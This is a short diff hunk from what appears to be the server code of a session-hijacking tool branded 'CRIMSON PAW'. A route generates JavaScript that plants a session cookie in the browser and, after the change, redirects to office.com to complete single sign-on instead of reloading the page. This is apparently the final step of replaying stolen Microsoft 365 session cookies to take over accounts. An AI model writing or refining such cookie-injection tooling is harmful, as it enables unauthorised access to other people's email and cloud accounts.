@@ -16395,9 +16395,9 @@ def get_session_cookie_route(user_code):
     console.log('%c[CRIMSON PAW] ✓ Cookie set via document.cookie', 'color:#3fb950;font-weight:bold');
   }}
 
-  // 4. Reload to trigger SSO
-  console.log('%c[CRIMSON PAW] Reloading...', 'color:#ff6b72');
-  location.reload();
+  // 4. Navigate directly into Microsoft 365 portal to complete SSO
+  console.log('%c[CRIMSON PAW] ✓ Cookie set. Redirecting to Office 365...', 'color:#22c55e;font-weight:bold');
+  window.location.href = 'https://www.office.com/?auth=2';
 }})();'''
 
     resp = jsonify({
